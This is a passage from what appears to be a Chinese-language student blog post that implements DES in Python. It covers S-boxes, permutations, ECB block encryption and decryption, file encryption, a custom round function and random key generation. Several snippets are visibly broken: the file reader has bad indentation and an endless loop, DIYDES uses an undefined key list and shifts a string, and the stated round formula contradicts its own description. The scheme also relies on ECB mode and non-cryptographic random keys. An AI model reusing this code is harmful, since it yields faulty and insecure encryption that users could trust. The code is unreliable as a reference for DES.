class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>,</span><br><span class="line">                 <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>,</span><br><span class="line">                 <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>),</span><br><span class="line">                (<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>,</span><br><span class="line">                 <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>,</span><br><span class="line">                 <span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>,</span><br><span class="line">                 <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>),</span><br><span class="line">                (<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>,</span><br><span class="line">                 <span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">                 <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>,</span><br><span class="line">                 <span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>),</span><br><span class="line">                (<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">                 <span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">                 <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>,</span><br><span class="line">                 <span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>),</span><br><span class="line">                (<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>,</span><br><span class="line">                 <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">                 <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>,</span><br><span class="line">                 <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>),</span><br><span class="line">                (<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>,</span><br><span class="line">                 <span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">                 <span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">                 <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>),</span><br><span class="line">                (<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>,</span><br><span class="line">                 <span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">                 <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>,</span><br><span class="line">                 <span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>)]</span><br><span class="line">    S_Input = bin(S_Input)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">while</span> len(S_Input) &lt; <span class="number">48</span>:</span><br><span class="line">        S_Input = <span class="string">"0"</span> + S_Input</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    retstr = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> Slist <span class="keyword">in</span> STABLE:</span><br><span class="line">        row = int(S_Input[index] + S_Input[index + <span class="number">5</span>], base=<span class="number">2</span>)</span><br><span class="line">        col = int(S_Input[index + <span class="number">1</span>:index + <span class="number">5</span>], base=<span class="number">2</span>)</span><br><span class="line">        ret_single = bin(Slist[row * <span class="number">16</span> + col])[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">while</span> len(ret_single) &lt; <span class="number">4</span>:</span><br><span class="line">            ret_single = <span class="string">"0"</span> + ret_single</span><br><span class="line">        retstr += ret_single</span><br><span class="line">        index += <span class="number">6</span></span><br><span class="line">    <span class="keyword">assert</span> len(retstr) == <span class="number">32</span></span><br><span class="line">    <span class="keyword">return</span> retstr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">P</span><span class="params">(Ln, S_sub_str, oldRn)</span>:</span></span><br><span class="line">    PTABLE = [<span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">                <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span>]</span><br><span class="line">    tmp = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> PTABLE:</span><br><span class="line">        tmp += S_sub_str[i - <span class="number">1</span>]</span><br><span class="line">    LnNew = int(tmp, base=<span class="number">2</span>) ^ int(Ln, base=<span class="number">2</span>)</span><br><span class="line">    LnNew = bin(LnNew)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">while</span> len(LnNew) &lt; <span class="number">32</span>:</span><br><span class="line">        LnNew = <span class="string">"0"</span> + LnNew</span><br><span class="line">    <span class="keyword">assert</span> len(LnNew) == <span class="number">32</span></span><br><span class="line">    (Ln, Rn) = (oldRn, LnNew)</span><br><span class="line">    <span class="keyword">return</span> (Ln, Rn)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IP_inverse</span><span class="params">(L16, R16)</span>:</span></span><br><span class="line">    IPINVERSETABLE = [<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">                         <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">                         <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">                         <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>]</span><br><span class="line">    tmp = L16 + R16</span><br><span class="line">    retstr = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> IPINVERSETABLE:</span><br><span class="line">        retstr += tmp[i - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> len(retstr) == <span class="number">64</span></span><br><span class="line">    <span class="keyword">return</span> retstr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DES_ECB</span><span class="params">(ClearTxt,Keylist)</span>:</span></span><br><span class="line">    InitKeyCode = IP(ClearTxt)</span><br><span class="line">    Ln = InitKeyCode[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">    Rn = InitKeyCode[<span class="number">32</span>:]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> Keylist:</span><br><span class="line">        <span class="keyword">while</span> len(Rn) &lt; <span class="number">32</span>:</span><br><span class="line">            Rn = <span class="string">"0"</span> + Rn</span><br><span class="line">        <span class="keyword">while</span> len(Ln) &lt; <span class="number">32</span>:</span><br><span class="line">            Ln = <span class="string">"0"</span> + Ln</span><br><span class="line">        print(<span class="string">"Ln : "</span>,Ln)</span><br><span class="line">        print(<span class="string">"Rn : "</span>, Rn)</span><br><span class="line">        Rn_expand = expend(Rn)</span><br><span class="line">        print(<span class="string">"Rn_expand : "</span>,Rn_expand)</span><br><span class="line">        S_Input = int(Rn_expand, base=<span class="number">2</span>) ^ int(key, base=<span class="number">2</span>)</span><br><span class="line">        print(<span class="string">"S_Input : "</span>, S_Input)</span><br><span class="line">        S_sub_str = S_sub(S_Input)</span><br><span class="line">        print(<span class="string">"S_sub_str : "</span>, S_sub_str)</span><br><span class="line">        (Ln, Rn) = P(Ln, S_sub_str, Rn)</span><br><span class="line">    (Ln, Rn) = (Rn, Ln)</span><br><span class="line">    re_text = IP_inverse(Ln, Rn)</span><br><span class="line">    <span class="keyword">return</span> re_text</span><br></pre></td></tr></table></figure><h4 id="加密分组实现"><a href="#加密分组实现" class="headerlink" title="加密分组实现"></a>加密分组实现</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encryptmohex</span><span class="params">(tmplist)</span>:</span></span><br><span class="line">    str_bin = <span class="string">''</span>.join(tmplist)</span><br><span class="line">    groups = int(len(str_bin) / <span class="number">64</span>)</span><br><span class="line">    <span class="comment"># 生成加密分组</span></span><br><span class="line">    M = np.zeros((groups, <span class="number">64</span>))</span><br><span class="line">    index = <span class="number">-8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(groups):</span><br><span class="line">        index += <span class="number">8</span></span><br><span class="line">        strr = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            strr += tmplist[index + j]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">            M[i][j] = int(strr[j])</span><br><span class="line">    print(<span class="string">"Your List Clear Text: "</span>, tmplist)</span><br><span class="line">    print(<span class="string">"Your Binary Clear Text: "</span>, str_bin)</span><br><span class="line">    print(<span class="string">"Your Hex Clear Text: "</span>, hex(int(str_bin, base=<span class="number">2</span>)).upper())</span><br><span class="line">    print(<span class="string">"Your Clear Text groups: "</span>, groups)</span><br><span class="line">    key_bin = inkey()</span><br><span class="line">    <span class="comment"># 打印加密群</span></span><br><span class="line">    AllCiphertext = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(groups):</span><br><span class="line">        print(<span class="string">"ClearText Group "</span>, i, <span class="string">": "</span>, end=<span class="string">''</span>)</span><br><span class="line">        tmptext = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">            tmptext += str(int(M[i][j]))</span><br><span class="line">        ciphertext = Feistel(tmptext, key_bin, <span class="number">1</span>)</span><br><span class="line">        AllCiphertext += ciphertext</span><br><span class="line">        print(<span class="string">"Ciphertext: "</span>, ciphertext)</span><br><span class="line">    print(<span class="string">"Your Binary Ciphertext: "</span>, AllCiphertext)</span><br><span class="line">    print(<span class="string">"Your Hex Ciphertext: "</span>, hex(int(AllCiphertext, base=<span class="number">2</span>)).upper())</span><br></pre></td></tr></table></figure><h4 id="解密分组实现"><a href="#解密分组实现" class="headerlink" title="解密分组实现"></a>解密分组实现</h4><p>主函数同加密分组实现，只需要把密钥取反即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keylist = keylist[::<span class="number">-1</span>] <span class="comment">#INVERSEKEY</span></span><br></pre></td></tr></table></figure><h3 id="附加内容"><a href="#附加内容" class="headerlink" title="附加内容"></a>附加内容</h3><h4 id="用电码本模式对文件进行加密和解密"><a href="#用电码本模式对文件进行加密和解密" class="headerlink" title="用电码本模式对文件进行加密和解密"></a>用电码本模式对文件进行加密和解密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">opentxt</span><span class="params">()</span>:</span></span><br><span class="line"> f = open(<span class="string">'/tmp/test.txt'</span>)</span><br><span class="line">     str1 = <span class="string">""</span></span><br><span class="line">     <span class="keyword">while</span> true:</span><br><span class="line">        str1 = f.readline()</span><br><span class="line">     <span class="keyword">return</span> str1</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encryptmostr</span><span class="params">(text)</span>:</span></span><br><span class="line">    lenth = len(text)</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 补位操作</span></span><br><span class="line">    <span class="keyword">if</span> (lenth % <span class="number">8</span> == <span class="number">0</span>):</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        offset = <span class="number">8</span> - lenth % <span class="number">8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(offset):</span><br><span class="line">        text += <span class="string">'A'</span></span><br><span class="line">    tmplist = encode(text)</span><br><span class="line">    groups = int(len(tmplist) / <span class="number">8</span>)</span><br><span class="line">    <span class="comment">#对齐8位</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(tmplist)):</span><br><span class="line">        <span class="keyword">if</span> len(tmplist[i]) != <span class="number">8</span>:</span><br><span class="line">            tmpp = <span class="string">""</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span> - len(tmplist[i])):</span><br><span class="line">                tmpp += <span class="string">'0'</span></span><br><span class="line">            tmplist[i] = tmpp + tmplist[i]</span><br><span class="line">    str_bin = <span class="string">''</span>.join(tmplist)</span><br><span class="line">    <span class="comment">#生成加密分组</span></span><br><span class="line">    M = np.zeros((groups, <span class="number">64</span>))</span><br><span class="line">    index = <span class="number">-8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(groups):</span><br><span class="line">        index += <span class="number">8</span></span><br><span class="line">        strr = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> tmplist[index+j]:</span><br><span class="line">                strr += k</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">            M[i][j] = int(strr[j])</span><br><span class="line">    print(<span class="string">"Your List Clear Text: "</span>,tmplist)</span><br><span class="line">    print(<span class="string">"Your Binary Clear Text: "</span>,str_bin)</span><br><span class="line">    print(<span class="string">"Your Hex Clear Text: "</span>, hex(int(str_bin, base=<span class="number">2</span>)).upper())</span><br><span class="line">    print(<span class="string">"Your Clear Text offset: "</span>, offset)</span><br><span class="line">    print(<span class="string">"Your Clear Text groups: "</span>, groups)</span><br><span class="line">    key_bin = inkey()</span><br><span class="line">    <span class="comment">#打印加密群</span></span><br><span class="line">    AllCiphertext = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(groups):</span><br><span class="line">        print(<span class="string">"ClearText Group "</span>, i)</span><br><span class="line">        tmptext = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">            tmptext += str(int(M[i][j]))</span><br><span class="line">        ciphertext = Feistel(tmptext, key_bin, <span class="number">1</span>)</span><br><span class="line">        AllCiphertext += ciphertext</span><br><span class="line">        print(<span class="string">"Ciphertext: "</span>,ciphertext)</span><br><span class="line">    print(<span class="string">"Your Binary Ciphertext: "</span>,AllCiphertext)</span><br><span class="line">    print(<span class="string">"Your Hex Ciphertext: "</span>, hex(int(AllCiphertext, base=<span class="number">2</span>)).upper())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(s)</span>:</span><span class="comment">#字符串转二进制</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        tmp.append(bin(ord(c)).replace(<span class="string">'0b'</span>, <span class="string">''</span>))</span><br><span class="line">    str_bin = <span class="string">' '</span>.join(tmp)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(tmp)):</span><br><span class="line">        <span class="keyword">if</span> len(tmp[i]) != <span class="number">7</span>:</span><br><span class="line">            tmpp = <span class="string">""</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">7</span>-len(tmp[i])):</span><br><span class="line">                tmpp += <span class="string">'0'</span></span><br><span class="line">            tmp[i] =  tmpp + tmp[i]</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ParityCheck</span><span class="params">(s)</span>:</span><span class="comment">#偶校验</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">'1'</span>:</span><br><span class="line">            num = num +<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> num%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        s += <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s += <span class="string">'1'</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure><h4 id="自定义轮函数"><a href="#自定义轮函数" class="headerlink" title="自定义轮函数"></a>自定义轮函数</h4><p>F(W,K)=(1&lt;&lt;W)+K, 即W先循环左移1位再与K异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DIYDES</span><span class="params">(ClearTxt,Key,Model)</span>:</span></span><br><span class="line">    keylist = createkey(Key)</span><br><span class="line">    InitKeyCode = IP(ClearTxt)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> Keylist:</span><br><span class="line">        InitKeyCode = InitKeyCode &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        InitKeyCode = InitKeyCode ^ key</span><br><span class="line">     <span class="keyword">return</span> InitKeyCode</span><br></pre></td></tr></table></figure><h3 id="重要的实现细节"><a href="#重要的实现细节" class="headerlink" title="重要的实现细节"></a>重要的实现细节</h3><ul><li><p>随机密钥的生成</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> model == <span class="string">"y"</span>:</span><br><span class="line">    tmplist = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        j = random.randint(<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">1</span>:</span><br><span class="line">            tmplist.append(chr(random.randint(<span class="number">48</span>, <span class="number">57</span>)))</span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">2</span>:</span><br><span class="line">            tmplist.append(chr(random.randint(<span class="number">65</span>, <span class="number">90</span>)))</span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">3</span>:</span><br><span class="line">            tmplist.append(chr(random.randint(<span class="number">97</span>, 